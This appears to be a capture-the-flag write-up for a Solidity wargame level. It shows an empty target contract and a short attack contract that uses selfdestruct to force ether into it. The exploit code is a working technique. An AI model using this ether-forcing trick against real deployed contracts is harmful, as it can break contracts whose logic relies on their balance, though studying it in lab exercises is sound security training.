# Task

The goal of this level is to make the balance of the contract greater than zero.

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
This contract code appears to be an empty contract with ASCII art comment

![image](https://github.com/user-attachments/assets/7fbb2b9a-332d-447f-a336-16e659af176f)

"The best way to attack a contract is with another contract." hinted to the `selfdestruct` operation

You can read more about it [here](https://www.alchemy.com/overviews/selfdestruct-solidity)

Since, they hinted us to using another contract, this means we'll have to write a contract that that accepts ether as payment and then self destructs.

Below is our attack contract

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

contract drawFunds {

    constructor(address payable _owner) payable {
        require(msg.value > 0, "Not enough");
        selfdestruct(_owner);
    }

}
```
